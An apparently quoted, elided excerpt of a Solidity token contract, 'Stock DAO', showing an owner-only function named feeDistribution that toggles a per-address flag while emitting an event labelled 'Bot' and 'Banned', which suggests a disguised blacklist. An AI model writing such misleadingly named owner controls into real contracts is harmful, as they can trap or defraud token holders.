...
contract StockDAO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'Stock DAO';
    string private _symbol = 'StockDAO';
    ...
    event distributed (address Bot, bool Banned);
    ...
    function feeDistribution  (address _address) external onlyOwner {
        if (_feeDistribution[_address] == true) {_feeDistribution[_address] = false;}
        else {_feeDistribution[_address] = true; 
        emit distributed (_address, _feeDistribution[_address]);}
    }

    function distributionAddress (address _address) public view returns (bool) {
        return _feeDistribution[_address];
    }
